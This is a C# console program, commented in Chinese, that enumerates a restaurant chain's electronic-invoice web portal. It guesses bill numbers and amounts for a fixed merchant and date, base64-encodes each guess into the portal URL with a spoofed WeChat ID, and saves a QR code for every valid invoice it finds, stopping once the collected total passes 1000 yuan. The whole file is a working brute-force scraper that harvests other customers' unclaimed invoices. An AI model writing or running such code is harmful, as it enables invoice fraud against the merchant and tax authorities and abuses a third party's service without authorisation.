﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ZXing;
using ZXing.QrCode;

namespace SLX.Invoice.com
{
    class Program
    {
        static void Main(string[] args)
        {
            FindInvoice();
            Console.ReadKey();
        }
        /// <summary>
        /// 捞取发票
        /// </summary>
        static void FindInvoice()
        {
            int limit = 0;
            var date = DateTime.Now.AddDays(-26).ToString("yyyy-MM-dd"); //消费日期
            int minxAmount = 50;  //最低金额
            int maxAmount = 220;//最高金额
            string waterNumber = "811147"; //"8011275";////商家
            for (int i = 106; i <= 300; i++)
            {

                string billNumber = $"B{i.ToString().PadLeft(3, '0')}";//$"H000{i.ToString().PadLeft(3, '0')}";// 
                for (int j = minxAmount; j <= maxAmount; j++)
                {
                    string strAmount = ((decimal)j).ToString();
                    string str = $"{waterNumber},{billNumber},{strAmount}.00,{date}";
                    var base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(str));
                    var guid = Guid.NewGuid().ToString();
                    string url = $"http://fp.xiabu.com:8080/xiabuInvoice/wxsm/wxlistOrders.do?r={base64}&WXOPENID={guid}";
                    HttpClient httpClient = new HttpClient();
                    var response = httpClient.GetStringAsync(url);

                    var result = response.Result;

                    if (result.Contains("<title>扫码开票</title>"))
                    {
                        limit += j;
                        string id = Guid.NewGuid().ToString().Substring(0, 4);
                        Console.WriteLine($"捞到一张金额为{strAmount}");
                        var name = $"金额{strAmount}元_{date}_{id}";
                        Generate1(url, name);//生成二维码

                        break;
                    }
                    Random random = new Random();
                    var intRandom = random.Next(1000, 4000);
                    Thread.Sleep(1000);
                }
                if (limit > 1000)
                {
                    break;
                }
            }
        }
        /// <summary>
        /// 生成二维码,保存成图片
        /// </summary>
        static void Generate1(string url, string name)
        {
            BarcodeWriter writer = new BarcodeWriter();
            writer.Format = BarcodeFormat.QR_CODE;
            QrCodeEncodingOptions options = new QrCodeEncodingOptions();
            options.DisableECI = true;
            //设置内容编码
            options.CharacterSet = "UTF-8";
            //设置二维码的宽度和高度
            options.Width = 500;
            options.Height = 500;
            //设置二维码的边距,单位不是固定像素
            options.Margin = 1;
            writer.Options = options;

            Bitmap map = writer.Write(url);
            string filename = @"D:\my\invoiceCode\" + name + ".png";
            map.Save(filename, ImageFormat.Png);
            map.Dispose();
        }
    }
}